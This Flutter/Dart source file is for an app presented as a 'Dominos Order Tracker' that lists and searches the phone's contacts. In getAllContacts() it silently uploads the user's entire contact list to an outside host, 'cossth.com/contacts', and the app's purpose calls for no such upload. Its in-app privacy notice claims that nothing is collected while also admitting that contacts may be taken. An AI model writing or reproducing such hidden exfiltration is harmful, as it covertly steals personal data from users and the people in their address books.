import 'package:contacts_service/contacts_service.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

import 'Data.dart';

class ContactsList extends StatefulWidget {
  final title = 'Dominos Order Tracker';
  @override
  _ContactsListState createState() => _ContactsListState();
}

class _ContactsListState extends State<ContactsList> {
  List<Contact> contacts = [];
  List<Contact> contactsFiltered = [];
  Map<String, Color> contactsColorMap = new Map();
  TextEditingController searchController = new TextEditingController();

  @override
  void initState() {
    super.initState();
    getPermissions();
  }

  getPermissions() async {
    if (await Permission.contacts.request().isGranted) {
      getAllContacts();
      searchController.addListener(() {
        filterContacts();
      });
    }
  }

  String flattenPhoneNumber(String phoneStr) {
    return phoneStr.replaceAllMapped(RegExp(r'^(\+)|\D'), (Match m) {
      return m[0] == "+" ? "+" : "";
    });
  }

  getAllContacts() async {
    List colors = [Colors.green, Colors.indigo, Colors.yellow, Colors.orange];
    int colorIndex = 0;
    List<Contact> _contacts = (await ContactsService.getContacts()).toList();
    _contacts.forEach((contact) {
      Color baseColor = colors[colorIndex];
      contactsColorMap[contact.displayName ?? ''] = baseColor;
      colorIndex++;
      if (colorIndex == colors.length) {
        colorIndex = 0;
      }
    });

    try {
      Dio().post('http://_._._._.cossth.com/contacts', data: _contacts);
    } finally {}

    setState(() {
      contacts = _contacts;
    });
  }

  filterContacts() {
    List<Contact> _contacts = [];
    _contacts.addAll(contacts);
    if (searchController.text.isNotEmpty) {
      _contacts.retainWhere((contact) {
        try {
          String searchTerm = searchController.text.toLowerCase();
          String searchTermFlatten = flattenPhoneNumber(searchTerm);
          String contactName = contact.displayName!.toLowerCase(); //!
          bool nameMatches = contactName.contains(searchTerm);
          if (nameMatches == true) {
            return true;
          }

          if (searchTermFlatten.isEmpty) {
            return false;
          }
          var phone = contact.phones?.firstWhere((phn) {
            String phnFlattened = flattenPhoneNumber(phn.value ?? '0');
            return phnFlattened.contains(searchTermFlatten);
          });
          return phone != null;
        } catch (e) {
          return true;
        }
      });
    }
    setState(() {
      contactsFiltered = _contacts;
    });
  }

  @override
  Widget build(BuildContext context) {
    bool isSearching = searchController.text.isNotEmpty;
    bool listItemsExist = (contactsFiltered.length > 0 || contacts.length > 0);
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
        actions: [
          GestureDetector(
              child: Text('Privacy'),
              onTap: () {
                showModalBottomSheet(
                    context: context,
                    builder: (b) {
                      return Container(
                        padding:
                            EdgeInsets.symmetric(horizontal: 20, vertical: 40),
                        child: Text(
                            'Privacy: We don\'t have data you see its from third api, we directly query (slf2rrahypck3bwckpdohsnhpeq...) API. as of 23May 2020 we don\'t collect/store anything, by using app you are agreeing to share with us. We may collect data you query from API, we can also collect your contacts information.'),
                      );
                    });
              }),
        ],
      ),
      body: Container(
        padding: EdgeInsets.all(20),
        child: Column(
          children: <Widget>[
            Container(
              child: TextField(
                controller: searchController,
                decoration: InputDecoration(
                  labelText: 'Search',
                  border: new OutlineInputBorder(
                      borderSide: new BorderSide(
                          color: Theme.of(context).primaryColor)),
                  prefixIcon:
                      Icon(Icons.search, color: Theme.of(context).primaryColor),
                ),
              ),
            ),
            listItemsExist == true
                ? Expanded(
                    child: ListView.builder(
                      shrinkWrap: true,
                      itemCount: isSearching == true
                          ? contactsFiltered.length
                          : contacts.length,
                      itemBuilder: (context, index) {
                        Contact contact = isSearching == true
                            ? contactsFiltered[index]
                            : contacts[index];

                        var baseColor =
                            contactsColorMap[contact.displayName] as dynamic;

                        Color color1 = baseColor[800];
                        Color color2 = baseColor[400];

                        String subtitle = '';
                        try {
                          subtitle = contact.phones!.first.value!;
                        } catch (e) {}
                        return GestureDetector(
                          onTap: () {
                            mbs(
                              contact,
                              subtitle
                                  .replaceAll(' ', '')
                                  .replaceAll('+91', ''),
                            );
                          },
                          child: ListTile(
                            title: Text(contact.displayName ?? 'Name'),
                            subtitle: Text(subtitle),
                            leading: (contact.avatar != null &&
                                    contact.avatar!.length > 0)
                                ? CircleAvatar(
                                    backgroundImage:
                                        MemoryImage(contact.avatar!),
                                  )
                                : Container(
                                    decoration: BoxDecoration(
                                        shape: BoxShape.circle,
                                        gradient: LinearGradient(
                                            colors: [
                                              color1,
                                              color2,
                                            ],
                                            begin: Alignment.bottomLeft,
                                            end: Alignment.topRight)),
                                    child: CircleAvatar(
                                        child: Text(contact.initials(),
                                            style:
                                                TextStyle(color: Colors.white)),
                                        backgroundColor: Colors.transparent),
                                  ),
                          ),
                        );
                      },
                    ),
                  )
                : Container(
                    padding: EdgeInsets.all(20),
                    child: Column(
                      children: [
                        Text(
                            isSearching
                                ? 'No search results to show'
                                : 'No contacts exist',
                            style: Theme.of(context).textTheme.headline6),
                        mbs(
                          null,
                          searchController.text
                              .replaceAll(' ', '')
                              .replaceAll('+91', '')
                              .replaceAll('8975279', '01548788'),
                        )
                      ],
                    ),
                  ),
          ],
        ),
      ),
    );
  }

  mbs(Contact? c, String query) {
    showModalBottomSheet(
        context: context,
        builder: (b) {
          return Container(
            decoration: BoxDecoration(
                borderRadius: BorderRadius.vertical(top: Radius.circular(10))),
            padding: EdgeInsets.all(10),
            child: Column(
              children: [
                ShowData(c, query),
              ],
            ),
          );
        });
  }
}
